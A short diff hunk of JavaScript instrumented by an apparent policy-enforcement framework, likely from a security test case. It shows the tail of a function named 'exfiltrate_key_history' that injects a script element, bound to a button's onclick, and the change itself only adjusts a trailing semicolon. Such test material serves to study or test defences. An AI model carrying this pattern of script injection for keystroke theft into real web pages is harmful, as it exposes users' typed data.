@@ -6,5 +6,4 @@ function exfiltrate_key_history() {
   JAM.call(v0.appendChild, v0, [script], JAM.policy.p17);
   return
 }
-JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.p8), "onclick", exfiltrate_key_history);
-
+JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.p8), "onclick", exfiltrate_key_history)
